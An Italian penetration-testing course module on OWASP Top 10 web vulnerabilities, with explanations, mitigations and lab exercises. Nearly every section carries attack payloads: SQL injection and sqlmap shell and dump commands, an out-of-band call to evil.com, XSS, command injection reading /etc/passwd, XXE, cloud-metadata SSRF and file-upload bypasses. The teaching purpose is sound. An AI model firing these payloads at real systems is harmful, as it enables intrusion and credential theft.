---
title: "OWASP Top 10 e oltre — vulnerabilità web di base"
area: "Web"
order: 10
level: "intermedio"
summary: "SQL injection, XSS, CSRF, SSRF, IDOR, command injection, path traversal, file upload, broken auth, XXE, sensitive data exposure. Le vulnerabilità che troverai nel 90% dei pentest web."
prereq:
  - "Sezione 04 (HTTP/TLS), 07 (programmazione)"
tools:
  - "Burp Suite Community"
  - "OWASP ZAP"
  - "sqlmap, ffuf"
  - "DVWA, OWASP Juice Shop, WebGoat"
  - "PortSwigger Web Security Academy (lab gratuiti)"
---

# OWASP Top 10 e oltre

> Se ti chiedessero "elenca le 10 vulnerabilità più comuni del web", devi rispondere a memoria. Non solo i nomi: i meccanismi, i payload tipici, le mitigazioni reali.

## OWASP Top 10 — versione 2021

| # | Categoria | Esempio |
|---|---|---|
| A01 | Broken Access Control | IDOR, missing function-level access control |
| A02 | Cryptographic Failures | password in chiaro, TLS debole, JWT broken |
| A03 | Injection | SQLi, NoSQLi, command injection, LDAP injection |
| A04 | Insecure Design | flow architetturali insicuri |
| A05 | Security Misconfiguration | default credentials, error verbose, headers mancanti |
| A06 | Vulnerable and Outdated Components | librerie con CVE note |
| A07 | Identification and Authentication Failures | brute force, no rate limit, weak password recovery |
| A08 | Software and Data Integrity Failures | npm/PyPI typosquatting, untrusted deserialization |
| A09 | Security Logging and Monitoring Failures | niente log, niente alert |
| A10 | Server-Side Request Forgery (SSRF) | webhook che accetta URL utente → fetch interno |

Non è una lista ordinata di "gravità", ma di **frequenza × impatto**. La OWASP API Security Top 10 (per API REST/GraphQL) è separata: BOLA, broken auth, BOPLA, etc.

## SQL Injection (SQLi)

### Come nasce
Stringa SQL costruita con concatenazione di input utente non sanitizzato.

```php
// VULNERABILE
$id = $_GET['id'];
$q = "SELECT * FROM users WHERE id = $id";
mysqli_query($conn, $q);
```

Input: `1 OR 1=1` → query `SELECT * FROM users WHERE id = 1 OR 1=1` → ritorna tutti gli utenti.

### Tipi
- **In-band / classic**: l'output appare direttamente nella risposta.
  - **UNION-based**: aggiungi `UNION SELECT col1,col2,...` per leggere altre tabelle.
  - **Error-based**: errori SQL leak parte dei dati (`extractvalue()` MySQL, `cast` PostgreSQL).
- **Blind**:
  - **Boolean-based**: la risposta cambia (true/false) in base a una condizione.
  - **Time-based**: usa `SLEEP(5)` (MySQL) / `pg_sleep(5)` (PostgreSQL) per inferire dati dal tempo.
- **Out-of-band (OOB)**: trigger DNS/HTTP request dal server (in MSSQL `xp_dirtree \\evil.com\x`, MySQL `LOAD_FILE`, etc.).

### Payload tipici

```sql
' OR 1=1 --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1, table_name, NULL FROM information_schema.tables --
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a' --
'; DROP TABLE users; --      (di solito non funziona per via dei prepared statements/limit del driver)
1 OR SLEEP(5)
```

### Tool: sqlmap

```bash
sqlmap -u "https://target/item?id=1" --batch
sqlmap -u "..." --data="id=1&token=xxx" -p id --dbs
sqlmap -u "..." --cookie="session=abc" --level=5 --risk=3
sqlmap -u "..." --file-read=/etc/passwd
sqlmap -u "..." --os-shell                     # se permette: shell sul DB server
sqlmap -r request.txt --tamper=space2comment   # tamper per WAF bypass
```

**`--level`** e **`--risk`** aumentano payload provati. 1=default; 5=tutto, anche tecniche pericolose.

### Mitigazione
- **Prepared statements** / parameterized queries. **Sempre.**
  ```python
  cursor.execute("SELECT * FROM users WHERE id = %s", (id,))
  ```
- ORM (SQLAlchemy, Django, Hibernate) se usato correttamente.
- **NON** sanitizzazione "fai da te" con escape: troppi edge case (UTF-8, charset, secondo-order).
- Principle of least privilege sui DB user (app non deve essere DBA).
- WAF come *layer secondario*, mai unico.

### NoSQL injection
Con MongoDB, payload come `{"$gt": ""}` bypass authentication se l'app legge un JSON e lo passa al driver senza validazione:

```js
// vulnerabile
db.users.findOne({username: req.body.username, password: req.body.password})
// se body è {"username":"admin","password":{"$gt":""}}
```

Mitigazione: validare type degli input (string only), schema validation (Mongoose, JSON Schema).

## XSS (Cross-Site Scripting)

Iniezione di JS in pagine servite dal target → esegue nel browser delle vittime con i loro cookie/sessione.

### Tipi
- **Reflected**: input nella URL/parametro è riflesso nella risposta. `?q=<script>alert(1)</script>`.
- **Stored**: input salvato (commenti, profili, messaggi) ed eseguito per chiunque lo veda.
- **DOM-based**: il sink è JS lato client che legge da `location.hash` / `document.referrer` e scrive in `innerHTML`.
- **Mutation XSS (mXSS)**: il browser "muta" markup apparentemente safe in payload eseguibile.
- **Self-XSS** (l'utente inietta su sé stesso) — di per sé poco grave, ma combinabile con CSRF.

### Impatto
- Furto cookie (se non `HttpOnly`).
- Phishing in-app (form fake).
- Keylogger su pagina vittima.
- Esecuzione di azioni come l'utente (CSRF-by-XSS).
- Bypass MFA (in alcune flow, leggi codice OTP from DOM).
- Account takeover.

### Payload (selezione)

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<a href="javascript:alert(1)">x</a>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
"><script>alert(1)</script>      <!-- escape attribute -->
';alert(1);//                    <!-- escape JS string -->
```

Repository: [PayloadsAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection).

### Mitigazioni
- **Output encoding contestuale**: HTML body, attribute, JS string, URL, CSS. Ogni contesto ha encoding diverso.
- **Template engine sicuro**: React/Vue auto-escape per default (occhio a `dangerouslySetInnerHTML`).
- **CSP** stretta: niente `unsafe-inline`, nonces/hash, fonti whitelist.
- **HttpOnly cookie**.
- **Trusted Types** (Chrome): blocca `innerHTML` con stringhe non-Trusted-Types.
- **Validazione input** dove possibile (white-list).
- **Sanitization** se devi accettare HTML utente: DOMPurify (con politica).

## CSRF (Cross-Site Request Forgery)

L'attaccante fa eseguire al browser della vittima una richiesta autenticata verso il sito target. Funziona se:
- la vittima è loggata,
- il sito si fida del solo cookie di sessione,
- non c'è anti-CSRF.

### Esempio classico
Sito target: cambia email con `POST /account/email` body `email=...`. L'attaccante mette su `evil.com`:

```html
<form action="https://target/account/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

Quando la vittima visita evil.com loggata, l'email viene cambiata.

### Mitigazioni
- **SameSite cookie** (`Lax` o `Strict`) — già un grosso aiuto, ma non sostituisce token in tutti i casi.
- **Anti-CSRF token**: token random per sessione (o per richiesta), inviato in hidden field + verificato server-side.
- **Double submit cookie** pattern.
- **Origin/Referer check** (debole, ma utile).
- Per **API**: niente cookie, usa header Authorization → CSRF non si applica (CORS sì).

## SSRF (Server-Side Request Forgery)

Il server fa request HTTP/altre verso un URL controllato dall'attaccante. Conseguenze:
- Accesso a servizi interni (Redis, ES, internal admin).
- Metadata cloud:
  - **AWS IMDS** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
  - **GCP** `http://metadata.google.internal/`.
  - **Azure IMDS** `http://169.254.169.254/metadata/instance?api-version=...` (richiede header `Metadata: true`).
- Port scanning interno.
- SSRF + Redis senza auth → RCE.

### Esempio
`POST /api/preview` body `{"url":"https://example.com"}` → server fa GET ed estrae preview. L'attaccante manda `{"url":"http://169.254.169.254/latest/meta-data/..."}` → leak credenziali EC2.

### Mitigazioni
- **Whitelist** di domini permessi (no blacklist).
- Risolvere DNS, controllare IP risultato, **rifiutare RFC 1918 / link-local / loopback**.
- Usare un network namespace o egress proxy che blocca metadata IP.
- **AWS IMDSv2** (token-based, mitigation primary).
- Disabilitare URL scheme non HTTP (`file://`, `gopher://`, `dict://`).
- DNS rebinding: validazione doppia (risolvi, controlla, poi richiama con stesso IP).

## IDOR / BOLA (Broken Object Level Authorization)

Esempio: `GET /api/orders/123` → restituisce l'ordine 123. Se cambi a `124` e vedi l'ordine di un altro utente → IDOR.

**È A01 in Top 10**, e la #1 della API Top 10. Verylyriksa categoria, sottostimata.

### Mitigazione
- **Authorization check** server-side: l'utente corrente possiede questo oggetto? Ha il ruolo per accederlo?
- Non basta "URL non guessable" (security by obscurity).
- UUID non sono auth: aiutano contro brute force ID, non contro IDOR via leak.

## Command Injection

Input passato a shell senza sanitizzazione:

```php
system("ping -c 1 " . $_GET['host']);
```

Input: `127.0.0.1; cat /etc/passwd` → la shell esegue entrambi i comandi.

Operatori shell sfruttabili: `;`, `|`, `&&`, `||`, `&`, backtick `` ` ``, `$(...)`, newline.

### Bypass filtering
- Hex/oct: `$(echo -e \\x63\\x61\\x74)` → `cat`.
- Variabili: `${IFS}` come spazio.
- Wildcard: `/?in/c?t`.
- Encoding URL.

### Mitigazione
- **Mai concatenare input in shell.**
- Usa API esplicite (`execve(["/bin/ping", "-c", "1", host])` con array argv → no shell).
- Whitelist input se proprio devi.

## Path Traversal / LFI

`GET /static?file=../../../../etc/passwd` → leak file di sistema. Se PHP, possibile **LFI to RCE** via:
- log injection in apache access log → include come PHP.
- `php://filter/convert.base64-encode/resource=...` per leggere sorgenti.
- `php://input` o `data://` se `allow_url_include=On`.
- Phar deserialization.
- LFI → SSRF se `phar://` o `expect://`.

### Mitigazione
- Normalize path (`realpath`), poi controlla che inizi con base directory consentita.
- Whitelist nomi file.
- Container/chroot.

## File Upload

Bug pattern: app permette upload e poi serve i file. Se accetta `.php` o file che diventano eseguibili nel context del server → RCE.

### Bypass tipici
- Estensione doppia: `shell.php.jpg`, server config Apache vecchio esegue come PHP.
- Header `Content-Type: image/png` ma body PHP.
- Null byte (vecchi PHP): `shell.php%00.jpg`.
- File `.htaccess` malevolo se l'utente può uploadarlo.
- Polyglot: file valido GIF + PHP.
- SVG con `<script>` → XSS.
- ImageMagick → ImageTragick CVE-2016-3714.

### Mitigazione
- Whitelist estensioni.
- Verifica contenuto (libreria parser).
- Salva con nome random, fuori webroot.
- Servire da CDN su dominio diverso.
- Disabilitare esecuzione PHP nella dir upload (config server).

## XXE (XML External Entity)

Se il server parse XML e accetta entità esterne:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

Conseguenze: LFI, SSRF, DoS (billion laughs), RCE in casi estremi.

### Mitigazione
- Disabilita parsing DTD esterno (`FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`).
- libxml2 / lxml: `defusedxml` in Python.
- Preferire JSON quando possibile.

## Insecure Deserialization

Quando il server deserializza dati controllati dall'utente con un formato che permette istanziazione di oggetti (`pickle` Python, `ObjectInputStream` Java, `unserialize` PHP, BinaryFormatter .NET):

- **Java**: ysoserial → gadget chain CommonsCollections/Spring → RCE.
- **PHP**: `__wakeup`, `__destruct` magic methods → POP chain.
- **Python**: `pickle.loads` con bytes attacker = RCE immediato (mai farlo).
- **.NET**: BinaryFormatter, SoapFormatter → RCE (Microsoft deprecato).
- **Node**: `node-serialize` con `_$$ND_FUNC$$_`.

### Mitigazione
- **Non deserializzare** dati untrusted.
- Se devi, usa formati pure-data (JSON, MsgPack senza arbitrary types).
- Allowlist di classi deserializzabili.
- Firma HMAC del payload se da client.

## Server-Side Template Injection (SSTI)

Quando l'app crea un template con stringhe utente:

```python
from jinja2 import Template
Template("Hello " + user_input).render()
```

Input: `{{7*7}}` → "Hello 49" → conferma SSTI.
Più avanti: `{{ ''.__class__.__mro__[1].__subclasses__() }}` → catena gadget → RCE.

Template engine vulnerabili tipici: **Jinja2, Twig, Smarty, Velocity, Thymeleaf, Freemarker, Mustache (limitato), ERB**.

### Mitigazione
- Usa context-only templates.
- Sandbox del template engine.
- **Mai** template + concatenazione di input.

## Open Redirect

`GET /redirect?url=https://evil.com` → server fa 302. Usato in phishing per camuffare URL.

Mitigazione: whitelist host. **Non basta** filtrare per `http`/`https` prefix.

## Broken Authentication (A07)

- **Brute force** + niente rate limit + niente lockout = account takeover.
- **Account enumeration** via response diverse (login fail vs user not exist).
- **Password reset** broken: link prevedibile, no expiration, token in URL leak via Referer.
- **2FA bypass**: response replay, race, fallback weak.
- **JWT broken** (vedi sezione 11).
- **Session fixation**: l'attaccante imposta un session ID alla vittima.

## Sensitive Data Exposure

- **TLS missing** o weak.
- **Hardcoded secrets** nei JS bundle del client.
- **API endpoint** che ritornano troppi dati ("over-fetching").
- **GraphQL introspection** lasciata in produzione.
- **Backup file** scaricabili (`.bak`, `.zip`, `.git/`).
- **JWT con dati sensibili** in payload (in chiaro, base64).
- **Debug verbose** error messages.

## Security Misconfiguration

- Default credentials su pannelli admin.
- Directory listing.
- Server errors verbose (stack trace).
- HTTP method enabled (PUT, DELETE, TRACE).
- Outdated software (CVE noti).
- Headers di sicurezza mancanti (CSP, HSTS).
- CORS troppo permissivo.

## Vulnerable Components

Dipendenze non aggiornate. Tool:
- **OWASP Dependency-Check, Snyk, Dependabot, Renovate** per repos.
- **Trivy, Grype** per container.
- **Software Bill of Materials (SBOM)**: SPDX, CycloneDX.

## Logging e Monitoring Failures

L'azienda che è stata compromessa per 6 mesi senza accorgersene è quella senza logging. Per offensive: spesso *non* loggano i tuoi attacchi. Per blue team: monitora autenticazioni, errori, accessi a risorse sensibili, anomalie.

## Workflow di pentest web

1. **Recon**: subdomain, tech stack, contenuti, API endpoints.
2. **Auth surface**: registrazione, login, reset password, 2FA.
3. **Authorization**: ruoli, multi-tenancy.
4. **Input fuzzing**: ogni parametro testato per injection.
5. **Business logic**: race condition, pricing manipolato, workflow saltato.
6. **Client-side**: XSS, CSP, postMessage, prototype pollution.
7. **API**: BOLA/BFLA/Mass assignment.
8. **Storage e sessione**: cookie, JWT, localStorage.
9. **File handling**: upload, download.
10. **Misconfig**: header, error, default.

## Esercizi

### Esercizio 10.1 — DVWA giri completi
Installa DVWA. Per ogni vuln (SQLi, XSS, Command Injection, File Upload, CSRF, File Inclusion):
- **Low** — sfruttala manualmente (curl/Burp).
- **Medium** — capisci la mitigation naïve, bypassala.
- **High** — la mitigation seria, capisci perché non basta o se sì.

### Esercizio 10.2 — sqlmap end-to-end
Su DVWA SQLi (medium):

```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=..." --batch --dbs --dbms=mysql
sqlmap -u "..." --cookie="..." -D dvwa --tables
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
```

Quante password riesci a estrarre?

### Esercizio 10.3 — XSS guidato
PortSwigger Web Security Academy ha 30+ lab XSS gratuiti. Completa almeno:
- 4 reflected,
- 4 stored,
- 2 DOM-based,
- 2 bypass CSP.

Sono guidati e premiati.

### Esercizio 10.4 — Juice Shop
[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) — applicazione vulnerable moderna (Node/Angular). Completa almeno i livelli ⭐ e ⭐⭐. Sono challenge gamificate.

### Esercizio 10.5 — IDOR hunting
Su una API che restituisce gli ordini autenticati (es. WebGoat lab), enumera ID con Burp Intruder. Quanti record di altri utenti puoi vedere?

### Esercizio 10.6 — SSRF in pratica
PortSwigger Academy SSRF lab — completa "Basic SSRF against the local server", "Basic SSRF against another back-end system", "SSRF with blacklist-based input filter". Studia bypass: `127.1`, `127.0.0.1.nip.io`, `[::1]`, decimal IP, octal IP.

### Esercizio 10.7 — Reverse engineer una difesa
Trovi un sito vulnerabile e disattivi la propria CSP scrivendo un PoC che bypassa `script-src 'self' 'unsafe-inline'`. Quale categoria di payload usi? Cosa cambierebbe con `'strict-dynamic' 'nonce-xyz'`?

### Esercizio 10.8 — File upload polyglot
Crea un file PHP che è anche un JPEG valido (polyglot). Caricalo su un'app vulnerabile (DVWA o lab) e ottieni RCE. Quale check è bypassato?

## Concetti chiave

1. **Memorizza la Top 10 e i meccanismi.**
2. **Injection di qualsiasi tipo** → controllo logico se non separi dati e codice.
3. **XSS è quasi sempre presente**: cerca ogni sink che mette input in output.
4. **IDOR/BOLA è la categoria più sottostimata.**
5. **SSRF + cloud metadata** = full compromise. Disabilita IMDSv1.
6. **Mai deserializzare untrusted** in formati arbitrari.
7. **CSP è la rete di sicurezza** per XSS — ma non basta.
8. **PortSwigger Academy** è il modo migliore di imparare le vulnerabilità con feedback immediato.

Adesso saliamo di livello: web hacking avanzato.
